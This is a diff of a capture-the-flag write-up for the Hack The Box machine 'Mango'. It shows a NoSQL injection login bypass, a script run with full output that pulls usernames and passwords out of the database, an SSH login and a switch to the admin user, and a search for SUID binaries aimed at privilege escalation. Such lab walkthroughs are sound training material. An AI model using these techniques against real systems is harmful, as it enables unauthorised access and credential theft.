@@ -349,17 +349,211 @@ Let's test the login parameters with the following basic payloads:
 
 ![](<../../.gitbook/assets/5 (2).JPG>)
 
-We get a response message with a redirect to home.php. We have just bypassed the login page.
+We get a response message with a redirect to home.php. We have just bypassed the login page, and after being redirected, we end up at the page shown below:
 
+![](<../../.gitbook/assets/6 (2).JPG>)
 
+Ok, now what? We review the page source but there is nothing of interest. However, since we know there is a NoSQLi in the login form, let's attempt to extract data from the database using the vulnerable form.
+
+To do this, we'll use the following python script:
+
+{% embed url="https://github.com/an0nlk/Nosql-MongoDB-injection-username-password-enumeration" %}
+
+Let's clone the repo and run it against the target. First, we'll run it to extract the usernames and then the passwords as follows:
+
+```
+└─$ python3 nosqli.py -u http://staging-order.mango.htb/index.php -up username -pp password -ep username -op login:login -m POST 
+Pattern found that starts with 'a'
+Pattern found: ad                                                                                                 
+Pattern found: adm                                                                                                
+Pattern found: admi                                                                                               
+Pattern found: admin                                                                                              
+username found: admin                                                                                             
+Pattern found that starts with 'm'                                                                                
+Pattern found: ma                                                                                                 
+Pattern found: man                                                                                                
+Pattern found: mang                                                                                               
+Pattern found: mango                                                                                              
+username found: mango                                                                                             
+                                                                                                                  
+2 username(s) found:                                                                                              
+admin                                                                                                             
+mango
+
+└─$ python3 nosqli.py -u http://staging-order.mango.htb/index.php -up username -pp password -ep username -ep password -op login:login -m POST 
+Pattern found that starts with 'h'
+Pattern found: h3                                                                                                 
+Pattern found: h3m                                                                                                
+Pattern found: h3mX                                                                                               
+Pattern found: h3mXK                                                                                              
+Pattern found: h3mXK8                                                                                             
+Pattern found: h3mXK8R                                                                                            
+Pattern found: h3mXK8Rh                                                                                           
+Pattern found: h3mXK8RhU                                                                                          
+Pattern found: h3mXK8RhU~                                                                                         
+Pattern found: h3mXK8RhU~f                                                                                        
+Pattern found: h3mXK8RhU~f{                                                                                       
+Pattern found: h3mXK8RhU~f{]                                                                                      
+Pattern found: h3mXK8RhU~f{]f                                                                                     
+Pattern found: h3mXK8RhU~f{]f5                                                                                    
+Pattern found: h3mXK8RhU~f{]f5H                                                                                   
+password found: h3mXK8RhU~f{]f5H                                                                                  
+Pattern found that starts with 't'                                                                                
+Pattern found: t9                                                                                                 
+Pattern found: t9K                                                                                                
+Pattern found: t9Kc                                                                                               
+Pattern found: t9KcS                                                                                              
+Pattern found: t9KcS3                                                                                             
+Pattern found: t9KcS3>                                                                                            
+Pattern found: t9KcS3>!                                                                                           
+Pattern found: t9KcS3>!0                                                                                          
+Pattern found: t9KcS3>!0B                                                                                         
+Pattern found: t9KcS3>!0B#                                                                                        
+Pattern found: t9KcS3>!0B#2                                                                                       
+password found: t9KcS3>!0B#2                                                                                      
+                                                                                                                  
+2 password(s) found:                                                                                              
+h3mXK8RhU~f{]f5H                                                                                                  
+t9KcS3>!0B#2                                                                                                      
+                
+```
+
+The script extracts two usernames and two passwords, let's test them on the login page. The following two combinations work:at&#x20;
+
+admin:t9KcS3>!0B#2
+
+mango:h3mXK8RhU\~f{]f5H
 
 ## Gaining Access
 
-aaaa
+We know that port 22 is open on the target, so let's try and connect via SSH using the creds above. The "admin" creds doesn't work, however, we are able to login as the "mango" user.
 
-&#x20;​
+```
+└─$ ssh mango@10.10.10.162                                                                                  130 ⨯
+mango@10.10.10.162's password: 
+Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 4.15.0-64-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu Nov 18 14:17:19 UTC 2021
+
+  System load:  0.01               Processes:            102
+  Usage of /:   33.4% of 19.56GB   Users logged in:      0
+  Memory usage: 29%                IP address for ens33: 10.10.10.162
+  Swap usage:   0%
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+
+122 packages can be updated.
+18 updates are security updates.
+
+Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
+
+
+Last login: Thu Nov 18 03:25:53 2021 from 10.10.14.2
+mango@mango:~$ id
+uid=1000(mango) gid=1000(mango) groups=1000(mango)
+mango@mango:~$ ls
+mango@mango:~$​
+```
+
+Looking around, we find the "admin" users' home directory, which contains the user flag. The flag is only readable by the "admin" user. Let's see if we can switch user to "admin" using the creds we found. We successfully "su" to "admin" and we are now able to read the user flag.aer l
+
+```
+mango@mango:/home/admin$ su admin
+Password: 
+$ id
+uid=4000000000(admin) gid=1001(admin) groups=1001(admin)
+$ bash
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+admin@mango:/$ cd ~
+admin@mango:/home/admin$ ls
+user.txt
+admin@mango:~$ cat user.txt
+7337777db1aa717714cb81eed329d0d1
+admin@mango:/home/admin$
+
+```
 
 ## Privilege Escalation
+
+Let's check for SUID binaries:
+
+```
+admin@mango:/home/admin$ find / -perm -4000 2>/dev/null
+/bin/fusermount
+/bin/mount
+/bin/umount
+/bin/su
+/bin/ping
+/snap/core/7713/bin/mount
+/snap/core/7713/bin/ping
+/snap/core/7713/bin/ping6
+/snap/core/7713/bin/su
+/snap/core/7713/bin/umount
+/snap/core/7713/usr/bin/chfn
+/snap/core/7713/usr/bin/chsh
+/snap/core/7713/usr/bin/gpasswd
+/snap/core/7713/usr/bin/newgrp
+/snap/core/7713/usr/bin/passwd
+/snap/core/7713/usr/bin/sudo
+/snap/core/7713/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/7713/usr/lib/openssh/ssh-keysign
+/snap/core/7713/usr/lib/snapd/snap-confine
+/snap/core/7713/usr/sbin/pppd
+/snap/core/6350/bin/mount
+/snap/core/6350/bin/ping
+/snap/core/6350/bin/ping6
+/snap/core/6350/bin/su
+/snap/core/6350/bin/umount
+/snap/core/6350/usr/bin/chfn
+/snap/core/6350/usr/bin/chsh
+/snap/core/6350/usr/bin/gpasswd
+/snap/core/6350/usr/bin/newgrp
+/snap/core/6350/usr/bin/passwd
+/snap/core/6350/usr/bin/sudo
+/snap/core/6350/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/snap/core/6350/usr/lib/openssh/ssh-keysign
+/snap/core/6350/usr/lib/snapd/snap-confine
+/snap/core/6350/usr/sbin/pppd
+/usr/bin/newuidmap
+/usr/bin/newgrp
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/newgidmap
+/usr/bin/run-mailcap
+/usr/bin/chfn
+/usr/bin/chsh
+/usr/bin/sudo
+/usr/bin/at
+/usr/bin/traceroute6.iputils
+/usr/bin/pkexec
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
+/usr/lib/openssh/ssh-keysign
+/usr/lib/snapd/snap-confine
+admin@mango:/home/admin$ 
+```
+
+Going through the list, we find the "jjs" binary. Looking on GTFObins, there is an entry for it, however, it states that the SUID privesc doesn't work on Linux.m
+
+{% embed url="https://gtfobins.github.io/gtfobins/jjs" %}
+
+
+
+
+
+
 
 
 
